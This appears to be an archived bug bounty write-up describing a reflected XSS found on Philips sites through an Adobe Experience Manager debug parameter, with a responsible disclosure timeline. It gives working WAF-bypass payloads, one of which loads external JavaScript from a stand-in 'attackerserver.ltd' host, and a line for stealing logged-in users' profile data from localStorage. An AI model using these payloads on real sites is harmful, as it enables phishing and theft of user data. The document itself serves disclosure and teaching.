---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-09-17_reflected-xss-at-philipscom.md
original_filename: 2018-09-17_reflected-xss-at-philipscom.md
title: Reflected XSS at Philips.com
category: documents
detected_topics:
- xss
- command-injection
- automation-abuse
- api-security
tags:
- imported
- documents
- xss
- command-injection
- automation-abuse
- api-security
language: en
raw_sha256: 4c33fcb530179d45817febcf5c582895b8df41703bc9b81ba5eb457d82c50a0d
text_sha256: 7cf9667cc6f1c139ffc2531ae3a33755b2dfcf061da520b79a91f228e6ab0ec0
ingested_at: '2026-06-28T07:31:57Z'
sensitivity: unknown
redactions_applied: false
---

# Reflected XSS at Philips.com

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-09-17_reflected-xss-at-philipscom.md
- Source Type: markdown
- Detected Topics: xss, command-injection, automation-abuse, api-security
- Ingested At: 2026-06-28T07:31:57Z
- Redactions Applied: False
- Raw SHA256: `4c33fcb530179d45817febcf5c582895b8df41703bc9b81ba5eb457d82c50a0d`
- Text SHA256: `7cf9667cc6f1c139ffc2531ae3a33755b2dfcf061da520b79a91f228e6ab0ec0`


## Content

---
title: "Reflected XSS at Philips.com"
url: "https://medium.com/@jonathanbouman/reflected-xss-at-philips-com-e48bf8f9cd3c"
authors: ["Jonathan Bouman (@JonathanBouman)"]
programs: ["Philips"]
bugs: ["Reflected XSS"]
publication_date: "2018-09-17"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5695
scraped_via: "browseros"
---

# Reflected XSS at Philips.com

Press enter or click to view image in full size
Proof of concept
Reflected XSS at Philips.com
Jonathan Bouman
Follow
8 min read
·
Sep 17, 2018

827

5

Are you aware of any (private) bug bounty programs? I would love to get an invite. Please get in touch with me: Jonathan@Protozoan.nl

Background
As we learned from previous reports, XSS attacks can have a high impact; you are able to steal cookies, attack the browser of a visitor or use it to phish for login credentials.

Today we will learn more about a reflected XSS attack in Adobe Experience Manager (AEM) that bypasses the Web Application Firewall (WAF), it results in a fully working phishing login.

Philips
As always, we need to find a proper target for our attack. What about Philips? This year they won an award for being “The most reputable company in the Netherlands”. Customers trust their brand and this makes them a high profile target for phishers.

Press enter or click to view image in full size
Winning the award for the eleventh year in a row

Furthermore they’ve got a proper Responsible Disclosure, so we’re safe to help them. It’s time to claim our Hall of Honors mention!

Reconnaissance, finding attack vectors
Where do we start if we want to find a XSS bug? No strict rules. I always start with Aquatone in order to discover interesting subdomains, see this report for details. After that I start Burp Suite, see this report, and I start looking around for bugs!

Press enter or click to view image in full size
Add philips to the target scope, use .* as a joker to capture every philips hostname
Press enter or click to view image in full size
Example of a site map, you may send a request to the repeater to test it for XSS

While clicking around the website, Burp Suite captures all the requests and responses. Burp Suite has a nice feature that creates a site map out of this data. This gives us a quick insight in how the website is structured, it also allows us to easily repeat specific requests and check if a page is vulnerable to XSS attacks.

The principle of XSS is that we manipulate input variables (i.e. the website url or form fields) so we are able to inject our own HTML code into our targets website. Due to that we are able to inject some javascript code that changes the layout; for example into a phishing login.

The URL is an important attack vector. If parts of the URL got reflected in the page response, without being escaped, we have a potential reflected XSS bug.

Another important thing is to check if we are able to add HTML data to the website that persists in some database; a stored XSS.

Press enter or click to view image in full size
OWASP XSS Prevention cheat sheet, Rule #1: escape everything.

Long story short, after a few hours of trying I did not find any reflective or stored attack vectors. I probed all the different parameters in the URLs captured by the Burp Suite; all of them were properly escaped. Good job Philips :-).

Below you see an example of a manipulated request that tries to inject <h1>Hi mom</h1> into the page. It got escaped into &lt;h1&gt;Hi+mom&lt;/h1&gt; so the browser won’t try to render it as HTML, just as plain text.

Press enter or click to view image in full size
Example of a properly escaped variable used in the response.

What to do now? Find holes in the server framework itself!
To discover which framework is being used by Philips we may use tools like WhatCMS.org. They have created an algorithm that is able to detect 320 different CMS systems; perfect!

Press enter or click to view image in full size
Adobe Experience Manager wins the battle.

Another way to discover the name of the framework is by taking a closer look at the source code of the main page:

Code that refers to adobedtm.com
Press enter or click to view image in full size
Adobe DTM is part of Adobe Experience Cloud, Adobe Experience Manager is the CMS.

Now we know that Adobe Experience Manager (AEM) is used we should start reading as much as possible about this CMS. This gives us some feeling of where to look for the weak spots; what are the best practices, any security updates in the past and are there any hidden functions?

Adobe Experience Manager
Reading software documentation is a necessity, sometimes boring but often rewarding. Another thing you should always try is to just google on the software and look for blogs or other places where experts share their tricks.

We discover something interesting if we do a quick google search for URL parameters.

Press enter or click to view image in full size
The first hit.
Press enter or click to view image in full size
A debug parameter exists, it outputs the ‘layout information’ of components. Thanks Feike for sharing!
Press enter or click to view image in full size
This parameter does exists in the official documentation, they recommend to disable it in production.
Adobe even provided a AEM pen testing cheatsheet for us, thanks again!

What happens if we visit Philips their website with the /?debug=layout parameter?

Press enter or click to view image in full size
Woops, they forgot to disable the debug mode.

Does the debug mode renders our URL in the page, unescaped?

Press enter or click to view image in full size
The URL is being parsed in the page, the URL path is not escaped so we are able to inject HTML!

Yes it does! Let’s try some javascript.

Press enter or click to view image in full size
Mmm. Some WAF is blocking our request.

Bypassing the Web Application Firewall (WAF)
So we have our point of injection, the URL path combined with the debug=layout parameter. Now we need to find a piece of HTML that bypasses the firewall and executes our javascript.

Get Jonathan Bouman’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Identify the WAF
A quick way to indentify the WAF(s) used by a target is to use WhatWaf. It probes the target with some payloads and compares the outcome with a set of detection rules.

Press enter or click to view image in full size
Output of WhatWaf if we check www.Philips.com

The used WAF is ModSecurity and AkamaiGHost.

Bypass ModSecurity and AkamaiGHost
This is something I prefer to do by hand. Brute forcing it with the Burp Suite Intruder is possible, but hammering a server with plenty of requests is a bad idea; you will end up on some blacklist.

While drinking a good cup of tea we discover that:
1. The WAF blocks the <script> tag
2. The WAF allows the <body> tag
3. The WAF blocks almost all the javascript events (i.e. onerror, onload, onmouseout), but allows the use of the onpointerenter event.
4. The WAF blocks the string https:// in the path

I always check if jQuery is loaded on the page; it allows us to create a smaller payload that works crossbrowser (by using the getScript function).

Press enter or click to view image in full size
Just run jQuery.fn.jquery in the console. jQuery is loaded if you see a version number.

Now it’s time to construct our payload:

https://www.philips.nl/healthcare/<body onpointerenter="jQuery.getScript('https:/' +'/attackerserver.ltd/philips/inject.js')">?debug=layout

We inject a body tag, that triggers the jQuery getScript function when someone moves their cursor over the page. The getScript function loads our external javascript file and executes the content. We use the 'https:/' +'/attackerserver.ltd' in order to bypass the WAF https:// string filter.

We urlencode the payload in order to be sure that the link is valid and easy to send to our victim.

Working payload
https://www.philips.nl/healthcare/%3Cbody%20onpointerenter=%22jQuery.getScript('https:/'+'/attackerserver.ltd/philips/inject.js')%22%3E?debug=layout

Creating a proper proof of concept
Everyone knows the <script>alert('XSS')</script> payload as a proof of concept. However we will invest a few more minutes in making a more impressive proof of concept; a fully working phishing login.

This is a better way to show the impact to people, everyone understands the impact if they see a fake login screen.

In an upcoming report I will explain in detail how to create a proof of concept phishing login within a few minutes. Subscribe to my Twitter or Medium to get updates of any new posts ;-)

Bonus: Stealing user details from logged in users
Philips uses Janrain for their customer login. Janrain stores the user details in the localstorage of the browser. So we are able to steal the visitor details if one is logged in.

Press enter or click to view image in full size
Visitor details stored by Janrain in the localstorage

This line of javascript is enough to steal the user details of a logged in user:
var user = (localStorage.getItem("janrainCaptureProfileData")) ? localStorage.getItem("janrainCaptureProfileData") : "Not logged in";

Proof of concept in action

Press enter or click to view image in full size

Bypassing initial fix

The initial fix of Philips was to add a new firewall rule that blocks all the HTML tags. Leaving the debug mode on. However we are able to inject a HTML tag that is missing the> character.
https://www.philips.nl/healthcare/<body%20alt=al%20lang=ert%20onmouseenter="top['al'+lang](/PoC%20XSS%20Bypass%20by%20Jonathan%20Bouman/)"?debug=layout

Press enter or click to view image in full size
Example of the bypass on lightning.philips.com

The server will inject the payload and as you can see the > from the <br> tag will be used to close the body tag. Another nifty trick to bypass a WAF rule that blocks alert() strings: split the string into 2 pieces and add them as attributes to the HTML tag and merge them again in the same tag by using top[attribute1+attribute2].

Solutions

The most simple solution is to disable the debug mode; this can be done by configuring the dispatcher used by AEM.
The WAF may be improved to disable any the HTML tags in the url or onevent strings, however blacklisting is never a good solution; we will always find a new payload that bypasses the blacklist.

Impact of the attack

Extra filtration of user information visiting our prepared link
Attack the browser of visitors through injection of a framework like beefproject.com
Setting up a phishing login

Hall of Honors

Press enter or click to view image in full size
A mention in the Hall of Honors of Philips :-)

Timeline
13–07–18 Discovered bug, informed Philips by email
17–07–18 Asked Philips on Facebook Messenger if they received the report
17–07–18 Philips replied email that they received the report
17–07–18 Requested Philips to share the findings with the lighting.philips.com development team, this site is also vulnerable (Signify is the owner of Lighting Philips, a separate company. They share the Philips.com code base but have their own deployment and dev team).
26–07–18 Requested Philips for update, check if they informed Signify
30–07–18 Philips informs me that they deployed a fix on their own site, want to mention me in the Halls of Honors. No answer on Signify question.
30–07–18 Informed Philips that their fix (WAF rule) is not enough, debug mode still possible.
31–07–18 Created new payload that bypasses the new WAF rule, informed Philips.
18–08–18 Requested update; Philips.com looks fixed (no debug mode anymore), lightning.philips.com still vulnerable to both payloads
27–08–18 Requested update from Philips again, no response.
27–08–18 Requested email address of Signify IT Security Manager from a personal contact working at Signify/Philips Lighting. Informed Signify IT Security Manager by email.
28–08–18 Signify confirmed the bug
29–08–18 Philips informed me that they sent the report to the Lighting division but did not receive any response.
06–09–18 Wrote this report, requested update from Signify
07–09–18 Signify informed me that they are busy with the fix
13–09–18 Signify informed me that the fix is deployed, I confirmed the fix, requested to disclose on 17–09–18
16–09–18 Philips informed me that they have no remarks
17–09–18 Published this blog.
